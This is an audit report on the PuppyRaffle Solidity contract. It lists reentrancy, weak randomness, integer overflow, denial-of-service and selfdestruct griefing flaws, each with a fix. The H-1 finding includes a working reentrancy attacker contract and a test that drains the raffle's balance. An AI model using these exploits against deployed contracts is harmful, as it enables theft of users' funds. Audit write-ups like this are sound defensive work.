# High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` function allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Intereaction) and as a result enables participants to drain the contract balance. 

In `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and then we are updating `PuppyRaffle::Players` array.

```javascript
 function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }


```
A player who has entered the raffle could have a `fallback / receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They can continue the cycle till the contract balance is drained.


**Impact:** All fees paid by raffle entrants could be stolen by the malicious participants.

**Proof of Concept**
1: User enters the raffle
2: Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3: Attacker enters the raffle
4: Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>Code</summary>

```javascript
function test__reentrancyRefund() public {
 
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting Attack Contract Balance: %d", startingAttackContractBalance);
        console.log("Starting Puppy Raffle Balance: %d", startingPuppyRaffleBalance);

        console.log("Ending Attack Contract Balance: %d", address(attackerContract).balance);
        console.log("Ending Puppy Raffle Balance: %d", address(puppyRaffle).balance);
    }

```

</details>

And here is attacker contract.

<details>
<summary>Code</summary>


```javascript


contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= puppyRaffle.entranceFee()) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}


```

</details>


**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionaly we should move the event emission as well. 

```diff

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee); 

-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }

```

# [H-2] Weak randomness in `PuppyRaffle::SelectWinner` function allows an attacker to influence or predict the winner, or influence pr predict the winning puppy.


**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` is not a secure way to generate randomness. An attacker can influence the outcome of the winner by manipulating the `block.timestamp` and `block.difficulty`. 


*Note:* This additionaly means users could front-run this function and call `refund` if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and rarest puppy making the entire raffle pointless if it becomes a gas war as to who wins the raffle

**Proof of Concept:**
1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and can manipulate it to influence the winner.
2. User can manupulate/mine their `msg.sender` value to result in their address being used to generate the winner.
3. User can revert their `selectWinner` transaction if they are not the winner or get their favorite puppy.

**Recommended Mitigation:** Use a cryprographically provable random number generator such as Chainlink VRF to generate randomness.

### [H-3] integer overflow in `PupppyRaffle::totalFees` loses fees

**Description:** in solidity versions prior to 0.8.0, integer overflow is not checked by default. This means that if the `totalFees` variable overflows, the fees will be lost. 

```javascript
 address public feeAddress;
 uint64 public totalFees = 0;
  

``` 

**Impact:**In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the  `feeAddress` to collect later in `PuppyRaffle::withdrawFees`, However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees.

**Proof of Concept:** The following code demonstrates how the `totalFees` variable can overflow.
1: 4 players enter the raffle and the winner is selected, the fees are accumulated in `totalFees`.
2: We again enter the raffle, but this time with 85 players, in order to overflow the `totalFees` variable.
3: We then select the winner, and even being having additional 85 players, the `totalFees` variable is less than what it was for first 4 players. 

<details>
<summary>Code</summary>

```javascript
   function test__integerOverflow() public playersEntered{
       //Entered raffle with 4 players
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        
        console.log("Starting Total Fees: %d", startingTotalFees);

        uint256 playersNum = 85;

        address[] memory players = new address[](playersNum);
        for(uint256 i = 0; i < playersNum; i++){
            players[i] = address(i + playersNum);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("Ending Total Fees: %d", endingTotalFees);

        assert(endingTotalFees < startingTotalFees);

    }
    4: This will break this require statement in `PuppyRaffle::withdrawFees`, and the fees will not be collected by the `feeAddress`:

    ``` javascript

     function withdrawFees() external {
@>        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
    
    ```

    
```

</details>

**Recommended Mitigation:** 1: Use `uint256` for `totalFees` variable to prevent overflow.
2: Use `SafeMath` library to prevent overflow for version prior to 0.8.0 but still you will have trouble collecting fees if there will be too many players.
3: if you still want to use `uint64` for `totalFees` variable, then set a limit on the number of participants in the raffle in a way so that the `totalFees` would not overflow  and make it mandatory to withdraw fees before starting a new raffle.
4: There are more attack vectors with that require statement in `PuppyRaffle::withdrawFees`, so it is better to remove it. 

```diff
 contract PuppyRaffle is ERC721, Ownable {
  

     address public feeAddress;
+    uint256 public totalFees;
-    uint64 public totalFees = 0;

}
```





# Medium


### [M-1] `PuppyRaffle::enterRaffle` has an unbounded for loop, incrementing gas costs future entrants, making it vulnerable to Deniable-of-Service attack.

**Description:** In `PuppyRaffle.sol`, the `PuppyRaffle::enterRaffle` function employs an unbounded for loop to iterate over a dynamic public array. This operation involves reading from the storage to verify the uniqueness of entries. However, this design could potentially lead to escalating gas costs for new participants. An adversary could exploit this vulnerability to inflate the function’s execution cost, rendering it prohibitively expensive for future participants. This scenario could precipitate a Denial of Service (DoS) attack, thereby compromising the protocol’s accessibility and functionality.

<details>

<summary>Code</summary>

```javascript

   function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
   @>     for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            } // @audit: unbounded for loop can cause DoS attack
        }
        emit RaffleEnter(newPlayers);
    }

```
 </details>

**Impact:** Denial of service in `PuppyRaffle::enterRaffle` function.


**Proof of Concept**
The following code demonstrates a significant discrepancy in gas costs for new players in the smart contract. Specifically, it reveals that the gas expenditure for the initial 100 participants is substantially lower compared to the subsequent batch of 100 players.

<details>

<summary>Code</summary>

```javascript

 function testDoSAttack() public {
        //Number of players
        uint256 playersNum = 100;
        //array of first batch 100 of players who will participate in the raffle
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 startGas = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 endGas = gasleft();
        uint256 gasUsedFirst = startGas - endGas;
        console.log("Gas used For First 100 players: %d", gasUsedFirst);
        //array of second batch of 100 players who will participate in the raffle
        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = address(i + playersNum);
        }
        uint256 startGasSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
        uint256 endGasSecond = gasleft();
        uint256 gasUsedSecond = startGasSecond - endGasSecond;
        console.log("Gas used For Second 100 players: %d", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }

```

</details>



**Recommended Mitigation:**
Here are some of recommendations, any one of that can be used to mitigate this risk.

1: Simply allow duplicates. Anyhow a single user can enter multiple times by making multiple on-chain Addresses.

2: Use a mapping to check duplicates. For this approach you have to declare a variable uint256 raffleID, that way each raffle will have unique id. Add a mapping from player address to raffle id to keep of users for particular round.

<details>
<summary>Code</suumary>

```diff
+   mapping(address => uint256) userToRaffleId;
+   uint256 public raffleId;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           userToRaffleId[newPlayers[i]] = raffleID;
        }

        // Check for duplicates
       for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
-            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+            require(userToRaffleId[players[i]] != raffleId, "PuppyRaffle: Duplicate player");
            } 
        }
        emit RaffleEnter(newPlayers);
    }


    function selectWinner() external {
+    raffleId = raffleId + 1


    }



```
</details>

### [M-2] Smart contract wallets raffle winners without a `receive/fallback` function will block the start of a new contest. 

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging. 

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making  a lottery reset difficult. 

**Proof of Concept**

1. 10 smart contract wallets enter the lottery without a `receive/fallback` function.
2. The lottery ends.
3. The `PuppyRaffle::selectWinner` function is called but reverts due to the smart contract wallets not having a `receive/fallback` function.

**Recommended Mitigation:**
1. Do not allow smart contract wallets to enter the lottery. (not recommended)

2. Create a mappping of address -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their winnings. (Recommended)

>Pull over Push

### [M-3] Balance check on PuppyRaffle::withdrawFees enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** The PuppyRaffle::withdrawFees function checks the totalFees equals the ETH balance of the contract (address(this).balance). Since this contract doesn't have a payable fallback or receive function, you'd think this wouldn't be possible, but a user could selfdesctruct a contract with ETH in it and force funds to the PuppyRaffle contract, breaking this check.

```javascript

    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }

```

**Impact**: This would prevent the feeAddress from withdrawing fees. A malicious user could see a withdrawFee transaction in the mempool, front-run it, and block the withdrawal by sending fees.

**Proof of Concept:**

1: `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2: Malicious user sends 1 wei via a selfdestruct
3: feeAddress is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the PuppyRaffle::withdrawFees function.

```diff

    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```





# Low

### [L-1] `PuppyRaffle::getActiveIndexPlayer` returns 0 for non-existent player and for playeers at index 0, causing a player at index 0 incorrectly think that they have not entered raffle.

**Description:** If a player is in the `PuppyRaffle::players` array at 0, this will return zero but accoridng to the natspec it will also return 0 if the player is not in the array. 

```javascript
      function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact:** A player at index 0 may think that they have not entered raffle and may unknowingly assume his funds spent for entranceFee has been lost or try to enter the raffle again. 

**Proof of Concept**
1: User enters the raffle, they are the first entrant
2: `PuppyRaffle::getAtivePlayerIndex` returns 0
3: User thinks they have not entered the raffle and tries to enter again

**Recommended Mitigation:** The easiest recommendation would be revert if the player is not in the array instead of returning 0. 

You could also reserve the 0th position for any competition but a better solution might be to return `int256` where the value is `-1` if the player is not in the array.

# Informational

### [I-1] `PuppyRaffle::selectWinner` should follow CEI

It's best to keep code clean and follow CEI (Checks, Effects, Interactions) pattern. 

```javascript
    function selectWinner() external {
        require(msg.sender == owner, "PuppyRaffle: Only the owner can select a winner");
        require(block.timestamp >= lastWinnerTimestamp + timeBetweenWinners, "PuppyRaffle: Not enough time has passed since last winner");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, players.length))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = address(this).balance * feePercent / 100;
        uint256 winnings = address(this).balance - fee;

        payable(feeAddress).sendValue(fee);
        payable(winner).sendValue(winnings);

        lastWinnerTimestamp = block.timestamp;
        emit RaffleWinner(winner);
    }

```

### [I-2] use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it is much more readable if the numbers are given a name;

### [I-3] Floating pragmas

**Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.

https://swcregistry.io/docs/SWC-103/

**Recommended Mitigation:** Lock up pragma versions.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```

### [I-4] State changes are missing events










